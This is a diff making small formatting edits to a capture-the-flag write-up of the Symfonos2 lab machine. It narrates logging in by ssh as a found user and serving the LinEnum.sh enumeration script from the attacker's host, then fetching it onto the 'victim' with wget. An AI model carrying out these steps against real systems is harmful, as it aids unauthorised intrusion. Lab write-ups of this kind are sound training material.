@@ -40,7 +40,7 @@ Let's try to connect to the ftp servers as both anonymous and ftp. While these w
 
 ![symfonos2 ftp attempt](/assets/img/symfonos2-8.png)
 
-Reviewing the log file a bit further we come across a user account **aeolus**
+Reviewing the log file a bit further we come across a user account **aeolus**.
 
 ![symfonos2 log.txt](/assets/img/symfonos2-9.png)
 
@@ -54,7 +54,7 @@ We were able to successfully authenticate with these credentials via **ssh**.
 
 ![symfonos2 aeolus password](/assets/img/symfonos2-11.png)
 
-Let's do some enumeration. In order to enumerate, let's server up an http server and use *wget* to download Linenum.sh to our victim's computer. The server can be spun up by running `python -m SimpleHTTPServer` and then can be retrieved on the victim's pc with `wget http://192.168.68.135:8000/Linenum.sh`
+Let's do some enumeration. In order to enumerate, let's server up an http server and use **wget** to download Linenum.sh to our victim's computer. The server can be spun up by running `python -m SimpleHTTPServer` and then can be retrieved on the victim's pc with `wget http://192.168.68.135:8000/Linenum.sh`
 
 ![symfonos2 python http server](/assets/img/symfonos2-12.png)
 ![symfonos2 wget](/assets/img/symfonos2-13.png)
